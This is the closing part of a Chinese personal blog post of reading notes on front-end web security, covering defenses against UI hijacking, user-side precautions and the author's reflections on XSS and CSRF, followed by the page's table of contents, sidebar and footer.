<li>token防御，动态改变iframe的链接值</li>
</ul>
<h3 id="用户的防御"><a href="#用户的防御" class="headerlink" title="用户的防御"></a>用户的防御</h3><ul>
<li>使用安全的浏览器组合</li>
<li>遵守最小信任原则，不要使用通用密码啥的</li>
</ul>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>花了两天时间大概又重新看了一遍，现在对于XSS和CSRF有了比较深刻的理解，而对应界面操作劫持的概念还并不是十分清楚，此外包括浏览器编码形式等内容，需要进一步加深。</p>
<p>web安全是前端中一个非常重要的地方，但在项目中并没有给予更多的关注，在以后的开发中，应该需要加强这方面的保障。</p>

    </div>
    <footer class="article_ft">
        
        <a href="/tags/读书笔记" class="article_tag">#读书笔记</a>
        
    </footer>

    <div class="article_nav"><a href="/article/mockjs使用心得" class="hover-highlight article_prev">mockjs使用心得</a><a
                href="/article/博客SSR实践总结" class="hover-highlight article_next">博客SSR实践总结</a></div>
</article>
        </div>
    </main>

    <aside>
    <div class="page_sd hide-md">
        <div class="tab">
            <!---->
            
            <ul class="tab_nav">
                <li class="tab_item active" data-target="#J_toc">
                    文章目录
                </li>
                <li class="tab_item" data-target="#J_profile">
                    站点资料
                </li>
            </ul>
            <div class="tab_panel active" id="J_toc">
                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web安全的关键点"><span class="toc-number">1.</span> <span class="toc-text">web安全的关键点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入"><span class="toc-number">1.1.</span> <span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS跨站攻击"><span class="toc-number">1.2.</span> <span class="toc-text">XSS跨站攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF跨站请求伪造"><span class="toc-number">1.3.</span> <span class="toc-text">CSRF跨站请求伪造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#同源策略"><span class="toc-number">1.4.</span> <span class="toc-text">同源策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#社会工程学"><span class="toc-number">1.5.</span> <span class="toc-text">社会工程学</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web安全中的前端"><span class="toc-number">2.</span> <span class="toc-text">web安全中的前端</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#基本点"><span class="toc-number">2.1.</span> <span class="toc-text">基本点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JavaScript"><span class="toc-number">2.2.</span> <span class="toc-text">JavaScript</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSS"><span class="toc-number">2.3.</span> <span class="toc-text">CSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#前端黑客之XSS"><span class="toc-number">3.</span> <span class="toc-text">前端黑客之XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS类型"><span class="toc-number">3.1.</span> <span class="toc-text">XSS类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS的危害"><span class="toc-number">3.2.</span> <span class="toc-text">XSS的危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#防御XSS"><span class="toc-number">3.3.</span> <span class="toc-text">防御XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#前端黑客之CSRF"><span class="toc-number">4.</span> <span class="toc-text">前端黑客之CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF原理"><span class="toc-number">4.1.</span> <span class="toc-text">CSRF原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF类型"><span class="toc-number">4.2.</span> <span class="toc-text">CSRF类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF的危害"><span class="toc-number">4.3.</span> <span class="toc-text">CSRF的危害</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#前端黑客之界面操作劫持"><span class="toc-number">5.</span> <span class="toc-text">前端黑客之界面操作劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#类型"><span class="toc-number">5.1.</span> <span class="toc-text">类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#原理"><span class="toc-number">5.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#危害"><span class="toc-number">5.3.</span> <span class="toc-text">危害</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞检测和利用"><span class="toc-number">6.</span> <span class="toc-text">漏洞检测和利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#反射型XSS"><span class="toc-number">6.1.</span> <span class="toc-text">反射型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#存储型XSS"><span class="toc-number">6.2.</span> <span class="toc-text">存储型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM-XSS"><span class="toc-number">6.3.</span> <span class="toc-text">DOM XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#混淆的代码"><span class="toc-number">6.4.</span> <span class="toc-text">混淆的代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞利用"><span class="toc-number">6.5.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTML5"><span class="toc-number">6.6.</span> <span class="toc-text">HTML5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web蠕虫"><span class="toc-number">6.7.</span> <span class="toc-text">Web蠕虫</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#如何防御"><span class="toc-number">7.</span> <span class="toc-text">如何防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#浏览器厂商的防御"><span class="toc-number">7.1.</span> <span class="toc-text">浏览器厂商的防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web厂商的防御"><span class="toc-number">7.2.</span> <span class="toc-text">web厂商的防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS防御方案"><span class="toc-number">7.3.</span> <span class="toc-text">XSS防御方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF防御方案"><span class="toc-number">7.4.</span> <span class="toc-text">CSRF防御方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#界面操作劫持防御"><span class="toc-number">7.5.</span> <span class="toc-text">界面操作劫持防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#用户的防御"><span class="toc-number">7.6.</span> <span class="toc-text">用户的防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结"><span class="toc-number">8.</span> <span class="toc-text">小结</span></a></li></ol>
            </div>
            
            <div class="tab_panel " id="J_profile">
                <div>
                    <div class="me">
                        <img src="http://shymean.com/_nuxt/img/head.dd612ee.jpg" alt="shymean" width="100" height="100">
                        <h3>shymean</h3>
                        <p>一个不学无术且无趣的人。</p>
                    </div>
                    <div class="nav-border">
                        <a href="/book" class="nav_item">
                            <i class="iconfont icon-bookshelf"></i>
                            <br>书架
                        </a>
                        <a href="/message" class="nav_item">
                            <i class="iconfont icon-comment"></i>
                            <br>留言
                        </a>
                        <a href="/about" class="nav_item">
                            <i class="iconfont icon-info"></i>
                            <br>关于
                        </a>
                    </div>
                    <div class="contact">
                        <a href="https://github.com/tangxiangmin" target="_blank" class="contact_link">
                            <i class="iconfont icon-github"></i> GitHub</a>
                        <a href="http://wpa.qq.com/msgrd?v=3&amp;uin=645234650&amp;site=qq&amp;menu=yes"
                            target="_blank" class="contact_link">
                            <i class="iconfont icon-qq"></i> QQ</a>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="tool">
        <div class="btn-list hide-md" id="J_toggleSide">
            <div class="btn-icon">
                <span class="btn-line"></span>
                <span class="btn-line"></span>
                <span class="btn-line"></span>
            </div>
        </div>
        <div class="btn-top">
            <i class="iconfont icon-top"></i>
        </div>
    </div>
</aside>
    <footer class="page_ft">
    <div class="container footer">
        <p>世人的悲欢并不相通，我只是觉得他们吵闹。</p>
        <p>
            Copyright © Shymean 2016 - 2017
            <a href="http://www.miitbeian.gov.cn" rel="nofollow" target="_blank" style="display:inline-block;">粤ICP备17060238号-1</a>
        </p>
    </div>
    <div class="hide-xs">
        <script src="https://s19.cnzz.com/z_stat.php?id=1264491168&amp;web_id=1264491168" language="JavaScript"></script>
    </div>
</footer>

</div>

</body>
</html>